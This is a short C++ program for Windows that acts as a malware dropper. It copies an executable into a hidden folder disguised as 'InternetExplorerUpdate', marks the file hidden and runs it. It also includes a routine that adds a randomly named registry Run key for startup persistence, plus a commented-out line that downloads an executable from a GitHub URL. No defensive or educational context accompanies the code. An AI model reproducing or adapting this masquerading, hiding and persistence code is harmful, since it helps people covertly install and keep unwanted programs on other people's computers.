#include <iostream>
#include <urlmon.h>
#include <windows.h>
#include <time.h>
#include <stdio.h>
#include <string>
#include <fstream>
#include <iostream>
#include<cstdlib>

#pragma comment(lib,"urlmon.lib")

using namespace std;



void gen_random(wchar_t *s) {
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < 4; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

}


void autorun(wchar_t *way) {

	wchar_t rnd[5];
	gen_random(rnd);
	cout << rnd << endl;

	DWORD dwtype = 0;
	DWORD dwBufsize = sizeof(way);
	TCHAR szpath[MAX_PATH];
	HKEY hKeys;
	if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeys, NULL))
	{
		RegSetValueEx(hKeys, rnd, 0, REG_SZ, reinterpret_cast<const BYTE*>(way), (wcslen(way) + 1) * sizeof(*way));
		RegCloseKey(hKeys);
		//MessageBox(NULL, L"Hello!", L"Autorun", 0);
	}


}

void copipast() {

	CreateDirectory(L"C:\\InternetExplorerUpdate", NULL);
	SetFileAttributes(L"C:\\InternetExplorerUpdate", FILE_ATTRIBUTE_HIDDEN); //даем атрибут скрытый

	char * buffer;
	buffer = new char;

	ifstream infile("123.exe", ios::binary);
	ofstream outfile("C:\\InternetExplorerUpdate\\12345.exe", ios::binary);

	while (!infile.eof()) {
		infile.read(buffer, sizeof(char));
		outfile.write(buffer, sizeof(char));
	}

	delete buffer;

	SetFileAttributes(L"C:\\InternetExplorerUpdate\\12345.exe", FILE_ATTRIBUTE_HIDDEN); //даем атрибут скрытый
	
}

void startuem() {
	system("start C:\\InternetExplorerUpdate\\12345.exe");
}

int main()
{

	
	wchar_t way[255] = L"C:\\Users\\R0man\\Pictures\\123.exe";
	

	

	//URLDownloadToFile(0, TEXT("https://github.com/senaKash/senaKash/raw/master/123.exe"), TEXT("C:\\123.exe"), 0, 0);
	


	copipast();
	
	startuem();
	
	//autorun(way);

	
	

	




	
};

